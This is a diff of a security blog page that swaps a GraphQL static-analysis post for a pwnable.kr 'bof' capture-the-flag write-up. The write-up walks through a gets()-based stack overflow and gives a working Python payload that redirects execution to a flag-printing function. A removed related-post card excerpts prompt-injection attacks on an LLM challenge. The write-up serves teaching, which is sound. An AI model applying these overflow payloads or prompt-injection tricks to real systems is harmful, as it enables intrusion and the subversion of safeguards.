@@ -38,27 +38,27 @@
   
     <!-- Begin Jekyll SEO tag v2.8.0 -->
 <meta name="generator" content="Jekyll v4.3.2" />
-<meta property="og:title" content="Improving GraphQL security with static analysis" />
+<meta property="og:title" content="Pwnable.kr - bof Challenge (Buffer Overflow)" />
 <meta name="author" content="snoopysecurity" />
 <meta property="og:locale" content="en" />
-<meta name="description" content="GraphQL frameworks can often be interesting to code review, and often most static analysis tools don’t support them. Some work I did regarding this can be found here: https://snyk.io/blog/graphql-security-static-analysis-snyk-code/" />
-<meta property="og:description" content="GraphQL frameworks can often be interesting to code review, and often most static analysis tools don’t support them. Some work I did regarding this can be found here: https://snyk.io/blog/graphql-security-static-analysis-snyk-code/" />
-<link rel="canonical" href="http://localhost:4000/posts/improving-graphql-security-with-static-analysis/" />
-<meta property="og:url" content="http://localhost:4000/posts/improving-graphql-security-with-static-analysis/" />
+<meta name="description" content="This challenge, titled bof, introduces you to the classic concept of a buffer overflow. It’s one of the most fundamental exploit techniques and serves as an essential stepping stone into the world of binary exploitation." />
+<meta property="og:description" content="This challenge, titled bof, introduces you to the classic concept of a buffer overflow. It’s one of the most fundamental exploit techniques and serves as an essential stepping stone into the world of binary exploitation." />
+<link rel="canonical" href="http://localhost:4000/posts/pwnable-kr-solution-bof/" />
+<meta property="og:url" content="http://localhost:4000/posts/pwnable-kr-solution-bof/" />
 <meta property="og:site_name" content="💻 Blog" />
 <meta property="og:type" content="article" />
-<meta property="article:published_time" content="2022-04-13T03:25:52+08:00" />
+<meta property="article:published_time" content="2023-12-16T03:25:52+08:00" />
 <meta name="twitter:card" content="summary" />
-<meta property="twitter:title" content="Improving GraphQL security with static analysis" />
+<meta property="twitter:title" content="Pwnable.kr - bof Challenge (Buffer Overflow)" />
 <meta name="twitter:site" content="@snoopysecurity" />
 <meta name="twitter:creator" content="@snoopysecurity" />
 <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2022-04-13T03:25:52+08:00","datePublished":"2022-04-13T03:25:52+08:00","description":"GraphQL frameworks can often be interesting to code review, and often most static analysis tools don’t support them. Some work I did regarding this can be found here: https://snyk.io/blog/graphql-security-static-analysis-snyk-code/","headline":"Improving GraphQL security with static analysis","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/improving-graphql-security-with-static-analysis/"},"url":"http://localhost:4000/posts/improving-graphql-security-with-static-analysis/"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"snoopysecurity"},"dateModified":"2023-12-16T03:25:52+08:00","datePublished":"2023-12-16T03:25:52+08:00","description":"This challenge, titled bof, introduces you to the classic concept of a buffer overflow. It’s one of the most fundamental exploit techniques and serves as an essential stepping stone into the world of binary exploitation.","headline":"Pwnable.kr - bof Challenge (Buffer Overflow)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/posts/pwnable-kr-solution-bof/"},"url":"http://localhost:4000/posts/pwnable-kr-solution-bof/"}</script>
 <!-- End Jekyll SEO tag -->
 
   
 
-  <title>Improving GraphQL security with static analysis | 💻 | Blog
+  <title>Pwnable.kr - bof Challenge (Buffer Overflow) | 💻 | Blog
   </title>
 
   <!--
@@ -330,7 +330,7 @@
         
 
           
-            <span>Improving GraphQL security with static analysis</span>
+            <span>Pwnable.kr - bof Challenge (Buffer Overflow)</span>
           
 
         
@@ -407,6 +407,91 @@
 
 
 
+  
+  
+
+  <!-- CDN URL -->
+  
+
+  <!-- Add image path -->
+  
+
+  
+    
+      
+      
+    
+
+    
+    
+
+    
+
+    
+    
+
+    
+    
+    
+    
+
+    
+      
+
+      
+      
+      
+
+      
+
+    
+      
+
+      
+      
+      
+
+      
+
+    
+
+    <!-- take out classes -->
+    
+
+    
+
+    
+
+    
+
+    <!-- lazy-load images <https://github.com/aFarkas/lazysizes#readme> -->
+    
+    
+
+    <!-- add image placeholder -->
+    
+      
+    
+
+    <!-- Bypass the HTML-proofer test -->
+    
+
+    <!-- make sure the `<img>` is wrapped by `<a>` -->
+    
+
+    
+      <!-- create the image wrapper -->
+      
+    
+
+    <!-- combine -->
+    
+
+  
+
+  
+
+
 
 <!-- Add header for code snippets -->
 
@@ -443,7 +528,7 @@
 
 <!-- return -->
 
-<h1 data-toc-skip>Improving GraphQL security with static analysis</h1>
+<h1 data-toc-skip>Pwnable.kr - bof Challenge (Buffer Overflow)</h1>
 
 <div class="post-meta text-muted">
     <!-- published date -->
@@ -459,10 +544,10 @@
 
 
 <em class=""
-    data-ts="1649791552"
+    data-ts="1702668352"
     data-df="ll"
     data-toggle="tooltip" data-placement="bottom">
-  Apr 13, 2022
+  Dec 16, 2023
 </em>
 
     </span>
@@ -513,8 +598,8 @@
 
 <!-- return element -->
 <span class="readtime" data-toggle="tooltip" data-placement="bottom"
-  title="29 words">
-  <em>1 min</em> read</span>
+  title="465 words">
+  <em>2 min</em> read</span>
 
     </div>
 
@@ -523,7 +608,171 @@
 </div> <!-- .post-meta -->
 
 <div class="post-content">
-  <p>GraphQL frameworks can often be interesting to code review, and often most static analysis tools don’t support them. Some work I did regarding this can be found here: <a href="https://snyk.io/blog/graphql-security-static-analysis-snyk-code/">https://snyk.io/blog/graphql-security-static-analysis-snyk-code/</a></p>
+  <p>This challenge, titled bof, introduces you to the classic concept of a buffer overflow. It’s one of the most fundamental exploit techniques and serves as an essential stepping stone into the world of binary exploitation.</p>
+
+<p>We’re given a simple 32-bit Linux binary named bof. Your task is to exploit this binary to obtain a flag. Here’s what you’re provided:</p>
+
+<p><a href="/assets/img/blog/ctf/bof1.png" class="popup img-link "><img data-src="/assets/img/blog/ctf/bof1.png" alt="" class="lazyload" data-proofer-ignore></a></p>
+
+<p>After logging in and navigating to the file, use the file command to inspect the binary:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td><td class="rouge-code"><pre>file bof
+bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV)...
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>So we’re dealing with a 32-bit ELF executable. Next, decompile or reverse the binary using a tool like IDA, Ghidra, or objdump, or just run strings and ltrace to peek at its behavior.</p>
+
+<p>Alternatively, just run the binary and observe:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>./bof
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>It prompts for input, takes a string, and prints something like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>overflow me :)
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Disassembling the binary reveals a key function:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="rouge-code"><pre>void func(int key) {
+    if (key == 0xdeadbeef) {
+        system("/bin/cat flag");
+    } else {
+        printf("Invalid key: 0x%x\n", key);
+    }
+}
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>The main function looks like this:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td><td class="rouge-code"><pre>int main() {
+    char buffer[32];
+    printf("overflow me : ");
+    gets(buffer);
+    return 0;
+}
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>As you can see, gets() is used to receive input — and that’s where the vulnerability lies. gets() doesn’t enforce any boundary checks, meaning we can overwrite data past buffer, including the return address.</p>
+
+<p>To exploit this, we need to:</p>
+
+<p>Overflow the buffer to reach the return address.</p>
+
+<ol>
+  <li>
+    <p>Overwrite the return address so it jumps to the func() function.</p>
+  </li>
+  <li>
+    <p>Ensure the value of the key parameter is 0xdeadbeef.</p>
+  </li>
+</ol>
+
+<p>But wait — func() takes an argument (key). Since calling conventions place function arguments in registers or on the stack, we need to make sure when we redirect execution to func(), the stack is set up so that 0xdeadbeef is passed correctly.</p>
+
+<p>This means we need to:</p>
+
+<ul>
+  <li>
+    <p>Fill 32 bytes to overflow buffer.</p>
+  </li>
+  <li>
+    <p>Add 4 more bytes to reach the saved return address.</p>
+  </li>
+  <li>
+    <p>Overwrite that address with the location of func.</p>
+  </li>
+  <li>
+    <p>Add 4 more bytes (the fake return address after func).</p>
+  </li>
+  <li>
+    <p>Then add 0xdeadbeef as the value that will be passed as the argument.</p>
+  </li>
+</ul>
+
+<p>In memory, it would look like:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre></td><td class="rouge-code"><pre>[32 bytes buffer]
+[4 bytes padding]
+[func address]
+[fake return address]
+[0xdeadbeef]
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>First, find the address of func() using objdump or nm:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>nm bof | grep func
+</pre></td></tr></tbody></table></code></div></div>
+<p>which outputs</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>080484b4 T func
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>Now craft your payload using Python:</p>
+<div class="language-plaintext highlighter-rouge"><div class="code-header">
+        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
+      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>python -c 'print("A"*36 + "\xb4\x84\x04\x08" + "BBBB" + "\xef\xbe\xad\xde")' | ./bof
+</pre></td></tr></tbody></table></code></div></div>
+
+<p>which does:</p>
+
+<ul>
+  <li>
+    <p>“A”*36: Fills the buffer and padding.</p>
+  </li>
+  <li>
+    <p>“\xb4\x84\x04\x08”: Little-endian address of func().</p>
+  </li>
+  <li>
+    <p>“BBBB”: Filler for the fake return address.</p>
+  </li>
+  <li>
+    <p>“\xef\xbe\xad\xde”: 0xdeadbeef in little-endian format.</p>
+  </li>
+</ul>
+
+<p>When run, this should call func(0xdeadbeef) and output the flag.</p>
 
 </div>
 
@@ -534,7 +783,7 @@
   <div class="post-meta mb-3">
     <i class="far fa-folder-open fa-fw mr-1"></i>
     
-      <a href='/categories/software-security/'>software security</a>
+      <a href='/categories/web-application-security/'>web application security</a>
   </div>
   
 
@@ -543,8 +792,8 @@
   <div class="post-tags">
     <i class="fa fa-tags fa-fw mr-1"></i>
       
-      <a href="/tags/graphql/"
-          class="post-tag no-text-decoration" >graphql</a>
+      <a href="/tags/ctf/"
+          class="post-tag no-text-decoration" >ctf</a>
       
   </div>
   
@@ -1409,85 +1658,85 @@
   
 
   
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-
-  
-
-  
     
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
   
 
   
@@ -1924,7 +2173,7 @@
       
       
       <div class="card">
-        <a href="/posts/lakerta-gandalf-ctf/">
+        <a href="/posts/codesecurity-advent-calendar-2022/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1936,13 +2185,13 @@
 
 
 <em class="small"
-    data-ts="1686079552"
+    data-ts="1672601152"
     data-df="ll"
     >
-  Jun  7, 2023
+  Jan  2, 2023
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>LakeraAI Gandalf LLM CTF Solutions</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>SonarSource Advent Security Calendar 2022 Notes</h3>
             <div class="text-muted small">
               <p>
                 
@@ -1951,26 +2200,13 @@
 
 
 
-                Some useful sources that might help
+                Notes related to RipsTech/SonarSource CodeAdvent Security Calendar 2022. Official writeup here: https://www.sonarsource.com/knowledge/code-challenges/advent-calendar-2022/
 
+Day 1 - PHP
 
-  Prompt Injection Everywhere
-  Prompt Injection attacks on llm
+&amp;lt;?php
 
-
-Level 1
-
-You can ask for the password directly
-
-Prompt:
-
-1
-What is the password?
-
-
-Level 2
-
-P...
+s...
               </p>
             </div>
           </div>
@@ -1980,7 +2216,7 @@ P...
       
       
       <div class="card">
-        <a href="/posts/swift-deserialiation/">
+        <a href="/posts/ripstech_2017_security_calendar/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -1992,13 +2228,13 @@ P...
 
 
 <em class="small"
-    data-ts="1688153152"
+    data-ts="1521833152"
     data-df="ll"
     >
-  Jul  1, 2023
+  Mar 24, 2018
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Swift Deserialization Security primer</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>RipsTech PHP Security Calendar 2017 Notes</h3>
             <div class="text-muted small">
               <p>
                 
@@ -2007,8 +2243,14 @@ P...
 
 
 
-                NScoding and NSSecureCoding code related issues are often interesting to review and find. Some work I did regarding this can be found here: https://snyk.io/blog/swift-deserialization-security-primer/
+                Notes related to RipsTech PHP Security Calendar 2017 which aren’t accessible anymore.
 
+Challenge 1 - Wishlist
+
+class Challenge {
+    const UPLOAD_DIRECTORY = &#39;./solutions/&#39;;
+    private $file;
+    ...
               </p>
             </div>
           </div>
@@ -2018,7 +2260,7 @@ P...
       
       
       <div class="card">
-        <a href="/posts/cocoapods-yaml-deserialization/">
+        <a href="/posts/ripstech-java-advent-calendar/">
           <div class="card-body">
             <!--
   Date format snippet
@@ -2030,13 +2272,13 @@ P...
 
 
 <em class="small"
-    data-ts="1688498752"
+    data-ts="1578425152"
     data-df="ll"
     >
-  Jul  5, 2023
+  Jan  8, 2020
 </em>
 
-            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Cocoapods Yaml Insecure Deserialization Security Disclosure</h3>
+            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>RipsTech Java Security Calendar 2019 Notes</h3>
             <div class="text-muted small">
               <p>
                 
@@ -2045,7 +2287,13 @@ P...
 
 
 
-                YAML (YAML Ain’t Markup Language) is a popular data serialization format used in many programming languages, including Ruby. Insecure deserialization is a security vulnerability that occurs when an...
+                Notes related to RipsTech PHP Security Calendar 2019 which aren’t accessible anymore.
+
+Challenge 1 - Candy Cane
+
+import org.jdom2.Content;
+import org.jdom2.Document;
+import org.jdom2.JDOMException;...
               </p>
             </div>
           </div>
@@ -2064,16 +2312,16 @@ P...
 
 <div class="post-navigation d-flex justify-content-between">
   
-  <a href="/posts/rs-async-zipslip/" class="btn btn-outline-primary"
+  <a href="/posts/cocoapods-yaml-deserialization/" class="btn btn-outline-primary"
     prompt="Older">
-    <p>rs-async-zip Zip Path Traversal (Zip Slip)</p>
+    <p>Cocoapods Yaml Insecure Deserialization Security Disclosure</p>
   </a>
   
 
   
-  <a href="/posts/avoiding-smtp-injection/" class="btn btn-outline-primary"
+  <a href="/posts/saml-security/" class="btn btn-outline-primary"
     prompt="Newer">
-    <p>Avoiding SMTP Injection: A Whitebox primer</p>
+    <p>Common SAML vulnerabilities and how to remediate them</p>
   </a>
   
 
